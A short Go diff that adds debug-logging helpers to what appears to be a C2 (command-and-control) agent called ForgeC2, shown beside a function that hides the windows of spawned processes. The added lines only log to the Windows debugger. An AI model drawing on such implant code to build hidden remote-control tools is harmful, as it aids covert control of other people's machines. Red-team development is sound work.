@@ -259,6 +259,17 @@ func debugLog(msg string) {
 	}
 }
 
+func logDebug(msg string) {
+	debugLog(msg)
+}
+
+func logDebugf(format string, args ...interface{}) {
+	if Debug {
+		p, _ := syscall.UTF16PtrFromString("[ForgeC2] " + fmt.Sprintf(format, args...))
+		procOutputDebugStringW.Call(uintptr(unsafe.Pointer(p)))
+	}
+}
+
 func applyHideWindow(cmd *exec.Cmd) {
 	if cmd != nil {
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
